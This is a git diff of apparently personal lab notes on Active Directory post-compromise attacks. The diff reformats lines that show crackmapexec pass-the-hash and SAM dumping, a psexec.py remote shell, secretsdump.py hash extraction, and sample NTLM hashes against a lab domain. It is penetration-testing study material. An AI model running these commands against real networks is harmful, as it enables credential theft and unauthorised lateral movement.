@@ -47,26 +47,26 @@ kali$ bloodhound && then login with new creds.
     
 **Attacking AD - Post-Compromise Attacks:**
     - **Pass-The-Hash:**
-        `apt install crackmapexec` 
-        `crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1'` \
-        ![PTH_propanol_oxytocinDC_ethyl](Screenshots/Pass_Hash_e_triage.png)
-        `crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1' --sam` \
-        ![PTH_sam](Screenshots/PTH_sam.png) \
-        `psexec.py carbon.local/e.triage:'Password!1'@192.168.86.206`
-        ![psexec_loud_shell](Screenshots/psexec_shell_noisy.png)
+        -`apt install crackmapexec` 
+        -`crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1'` \
+        -![PTH_propanol_oxytocinDC_ethyl](Screenshots/Pass_Hash_e_triage.png)
+        -`crackmapexec smb 192.168.86.0/24 -d carbon.local -u e.triage -p 'Password!1' --sam` \
+        -![PTH_sam](Screenshots/PTH_sam.png) \
+        -`psexec.py carbon.local/e.triage:'Password!1'@192.168.86.206`
+        -![psexec_loud_shell](Screenshots/psexec_shell_noisy.png)
     - **Secretsdump.py:**
-        `secretsdump.py carbon/e.triage:'Password!1'@192.168.86.206`
-        ![secrets](Screenshots/secrets_dump.png)
+        -`secretsdump.py carbon/e.triage:'Password!1'@192.168.86.206`
+        -![secrets](Screenshots/secrets_dump.png)
     - **NTLM hash Example:**
             ```
         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
         Propylene Malz:1001:aad3b435b51404eeaad3b435b51404ee:3d888ed3f1196c792588c37ddfd32746:::
-        
             ```
+
     ***You can pass NTLM hashes around but CANNOT pass NTLMv2 hashes***
 
-[log4j_notice](https://community.neo4j.com/t/log4j-cve-mitigation-for-neo4j/48856)
-[powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)
-[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound)
-[bloodhoundGH](https://github.com/BloodHoundAD)
+[log4j_notice](https://community.neo4j.com/t/log4j-cve-mitigation-for-neo4j/48856)\
+[powerview.ps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView)\
+[hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound)\
+[bloodhoundGH](https://github.com/BloodHoundAD)\
 [sharphound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
